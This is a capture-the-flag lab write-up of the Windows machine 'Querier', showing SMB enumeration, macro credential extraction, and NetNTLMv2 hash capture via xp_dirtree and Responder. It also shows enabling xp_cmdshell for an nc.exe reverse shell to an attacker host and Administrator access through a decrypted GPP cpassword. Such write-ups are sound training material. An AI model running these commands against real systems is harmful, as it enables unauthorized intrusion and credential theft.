# Querier — Medium — Windows

**Date:** 09 - August - 2026

---

## Tags

`#windows` `#smb` `#mssql` `#macros` `#xp_dirtree` `#responder` `#netntlmv2` `#xp_cmdshell` `#gpp-password` `#privesc`

---

## What I Know

|Item|Detail|
|---|---|
|Target|10.129.47.247 (host: QUERIER, domain HTB.LOCAL)|
|OS|Windows Server 2019 (10.0.17763)|
|Open ports|135, 139, 445, 1433, 5985, 47001, 49664–49671|
|Services|SMB (445); MSSQL Server 2017 (1433); WinRM (5985/47001); MSRPC|
|Foothold|Anon SMB share `Reports` → macro `.xlsm` → MSSQL creds → `xp_dirtree`+Responder → crack|
|User|`reporting` (macro creds) → `mssql-svc` (cracked NetNTLMv2) → shell via `xp_cmdshell`|
|Privesc|Cached GPP `cpassword` (MS14-025) → Administrator password → Evil-WinRM|
|Flags|user.txt as mssql-svc; root.txt as Administrator|

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.47.247
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-11 15:03 +0100
Nmap scan report for 10.129.47.247
Host is up (0.051s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 28.08 seconds
```

<img width="855" height="608" alt="image" src="https://github.com/user-attachments/assets/92d0214d-3537-4876-abb7-edf5f72457ec" />

```
nmap -sC -sV -p135,139,445,1433,5985,47001 10.129.47.247
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-11 15:05 +0100
Nmap scan report for 10.129.47.247
Host is up (0.018s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|     Target_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|_    Product_Version: 10.0.17763
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 16.53 seconds
```

<img width="1039" height="1148" alt="image" src="https://github.com/user-attachments/assets/c6cea267-ff5c-4c40-a032-7347dec6a2af" />

**What each port tells me:**

- **Port 135 (MSRPC)** — Standard Windows RPC endpoint mapper; confirms a typical Windows host with RPC exposed.
- **Ports 139, 445 (SMB)** — File-sharing surface worth checking for anonymous access / leaked data.
- **Port 1433 (ms-sql-s)** — MSSQL Server 2017. Interesting for sensitive data and, with the right privileges, OS command execution but needs creds.
- **Ports 5985, 47001 (WinRM)** — Windows Remote Management; a shell route once I have valid creds.
- **Ports 49664–49671 (MSRPC)** — Dynamic high-numbered RPC ports auto-allocated by Windows; not directly actionable without specific RPC enumeration.

---

## Enumeration Log

```
OBSERVATION:
- 135 and the high RPC ports are default Windows noise, ignore for now
- 5985/47001 (WinRM) need valid creds, so set aside
- 139/445 (SMB) worth checking for anonymous access / sensitive shares
- 1433 (MSSQL) worth investigating, but also needs creds
WHAT IT TELLS ME:
- SMB is the first point of interest, check for anonymous login and readable shares
WHAT I AM GOING TO TRY:
- Anonymous/guest login to SMB and enumerate shares
WHY:
- SMB is frequently misconfigured to allow anonymous access and leak files
RESULT:
- Anonymous SMB access is allowed. Enumerating shares shows an uncommon one, "Reports"
- Pulled "Currency Volume Report.xlsm" (a macro-enabled Excel workbook) from Reports
WHAT NEXT:
- Analyse the workbook / its macros
```

<img width="1155" height="330" alt="image" src="https://github.com/user-attachments/assets/9856e411-87ac-48f7-b94a-2f0bd5ec82c3" />

<img width="1732" height="508" alt="image" src="https://github.com/user-attachments/assets/e8b1adfa-1528-4c1c-a88b-879cd6a6d0f3" />

```
OBSERVATION:
- olevba on the .xlsm extracted a VBA macro containing a DB connection string with creds
  (user "reporting"), pointing at the MSSQL server
WHAT IT TELLS ME:
- These are MSSQL creds for port 1433 try them to read data or run OS commands
WHAT I AM GOING TO TRY:
- Connect to MSSQL with the reporting creds (impacket-mssqlclient, -windows-auth)
WHY:
- Connection strings exist to open DB sessions; with 1433 open it's worth authenticating
RESULT:
- Logged in as "reporting" but there were no useful tables, and xp_cmdshell was DENIED
  (reporting lacks the privilege)
- To escalate within MSSQL, I used xp_dirtree to force the server to authenticate to a UNC
  path on my box (\\<LHOST>\share) while Responder listened. This leaked the SQL service
  account's NetNTLMv2 hash, which I cracked with john → user mssql-svc
- Re-logged into MSSQL as mssql-svc. xp_cmdshell was still disabled by config, but mssql-svc
  CAN reconfigure it, so I enabled it (sp_configure 'show advanced options',1; RECONFIGURE;
  sp_configure 'xp_cmdshell',1; RECONFIGURE). Hosted nc.exe on my SMB server, then used
  xp_cmdshell to run a reverse-shell call → shell as mssql-svc → read user.txt
  (Note on evil-winrm: a connection can LOOK successful; unless the prompt shows the user's
  PWD, the login didn't actually work)
WHAT NEXT:
- Enumerate as mssql-svc for a privesc path to Administrator
```

<img width="1763" height="931" alt="image" src="https://github.com/user-attachments/assets/0de80fce-3b9d-4aab-ad1d-0bfc96bccd96" />

<img width="1826" height="161" alt="image" src="https://github.com/user-attachments/assets/1c747552-989e-493e-8a08-3064807c7048" />

<img width="2538" height="565" alt="image" src="https://github.com/user-attachments/assets/04b6356e-3cc1-46d0-8230-43054d8af592" />

<img width="1688" height="391" alt="image" src="https://github.com/user-attachments/assets/67c13138-c47d-4471-a88c-1c66198bfc2e" />

<img width="2541" height="793" alt="image" src="https://github.com/user-attachments/assets/c0f66514-358d-4228-92f3-8cfcf05590f9" />

<img width="1144" height="255" alt="image" src="https://github.com/user-attachments/assets/cd473d02-c888-4dea-a358-6b58417ff06b" />

<img width="932" height="759" alt="image" src="https://github.com/user-attachments/assets/aa138351-9f87-490b-92de-1867b8fa3c11" />

```
OBSERVATION:
- Windows Defender blocked a direct winPEAS transfer; staging it via my SMB share worked
- winPEAS flagged SeImpersonatePrivilege (a potato attack could reach SYSTEM), AND a cached
  GPP password, an Administrator credential recovered from a locally cached Group Policy
  Preferences XML (the cpassword field, decryptable via the public MS14-025 key)
WHAT IT TELLS ME:
- Two routes: a potato/token-impersonation attack, or simply reuse the leaked Administrator
  password over WinRM. The credential reuse is the cleaner win
WHAT I AM GOING TO TRY:
- Log in as Administrator over Evil-WinRM with the GPP-recovered password
WHY:
- The GPP cpassword directly yields Administrator's plaintext, no exploit staging needed
RESULT:
- Evil-WinRM as Administrator succeeded; read root.txt
```

<img width="1123" height="102" alt="image" src="https://github.com/user-attachments/assets/1d9894ac-833d-4480-beaf-3e828d9debeb" />

<img width="1144" height="225" alt="image" src="https://github.com/user-attachments/assets/a54fd238-d657-4c29-9c6b-8d3906cd292b" />

<img width="2154" height="421" alt="image" src="https://github.com/user-attachments/assets/bfd23572-1a1b-4a9a-8410-c3c6a2b8b504" />

<img width="1726" height="584" alt="image" src="https://github.com/user-attachments/assets/b731853b-7e29-4bb6-b42d-cf2fd33db9e7" />

---

## Foothold

**How I got in:** Anonymous SMB access exposed an uncommon share, `Reports`, containing a macro-enabled workbook `Currency Volume Report.xlsm`. `olevba` extracted a VBA macro with an MSSQL connection string for the `reporting` user. Logging into MSSQL as `reporting`, I couldn't run `xp_cmdshell`, so I used **`xp_dirtree`** against a UNC path on my box with **Responder** listening, captured the SQL service account's **NetNTLMv2** hash, and cracked it with John to recover **`mssql-svc`**'s password. Re-authenticating as `mssql-svc`, I enabled `xp_cmdshell` and executed a reverse shell, landing a shell as `mssql-svc` and reading user.txt.

**Command / exploit used:**

```
# anonymous SMB enumeration + pull the workbook
smbclient -N -L //10.129.47.247/
smbclient -N //10.129.47.247/Reports -c "get 'Currency Volume Report.xlsm'"

# extract macro creds
olevba 'Currency Volume Report.xlsm'      # → reporting : <password>

# login as reporting (no xp_cmdshell), then leak the service hash
impacket-mssqlclient QUERIER/reporting:'<password>'@10.129.47.247 -windows-auth
SQL> EXEC xp_dirtree '\\<LHOST>\share', 1, 1     # Responder catches NetNTLMv2 for mssql-svc

# crack, then re-login as mssql-svc and enable xp_cmdshell
john --wordlist=rockyou.txt mssql-svc.hash       # → corporate568 (example)
impacket-mssqlclient QUERIER/mssql-svc:'<password>'@10.129.47.247 -windows-auth
SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'net use \\<LHOST>\share && \\<LHOST>\share\nc.exe <LHOST> <LPORT> -e cmd'
nc -lnvp <LPORT>       # → shell as mssql-svc → user.txt
```

**Why it worked:** SMB permitted anonymous access, and a developer left live database credentials embedded in a spreadsheet macro on a readable share, secrets in a place no one thinks of as sensitive. `reporting` could authenticate but not execute commands; `xp_dirtree` is the lever, because it makes MSSQL reach out over SMB and thereby **authenticate as its own service account** to an attacker-controlled host, leaking a crackable NetNTLMv2 hash. The recovered `mssql-svc` account had rights to re-enable `xp_cmdshell`, which is MSSQL's built-in path from SQL query to OS command.

---

## Privilege Escalation

**Path taken (mssql-svc → Administrator):** As `mssql-svc`, winPEAS (staged over my SMB share to dodge Defender) surfaced a **cached Group Policy Preferences password**, an Administrator credential stored in a local GPP XML file's `cpassword` attribute. Because Microsoft published the static AES key for GPP `cpassword` (MS14-025), that value decrypts to plaintext. I reused the recovered Administrator password to log in over **Evil-WinRM** and read root.txt. (`SeImpersonatePrivilege` was also present, so a GodPotato route to SYSTEM existed as an alternative, but the GPP credential was the cleaner win.)

**Command / exploit used:**

```
# winPEAS / PowerUp surfaces the GPP cpassword → decrypts to Administrator's password
# (gpp-decrypt on the cpassword value if needed)

evil-winrm -i 10.129.47.247 -u Administrator -p '<gpp-recovered-password>'   # → root.txt
```

**Why it worked:** Group Policy Preferences once let admins push credentials to machines, storing them in an XML `cpassword` field encrypted with an AES key that Microsoft **publicly documented**, so any cached GPP XML containing a `cpassword` is effectively plaintext to anyone who can read it (MS14-025). The Administrator password had been distributed this way and left cached on the host, so recovering it needed no cracking, just decryption with the known key and Administrator's reused password authenticated straight over WinRM.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Pulled MSSQL macro creds from an `.xlsm` on an anonymous SMB share, used `xp_dirtree` + Responder to leak and crack the `mssql-svc` NetNTLMv2 hash, then enabled `xp_cmdshell` for a shell.
2. **Privesc technique in one sentence:** Recovered the Administrator password from a cached GPP `cpassword` (MS14-025) and logged in over Evil-WinRM.
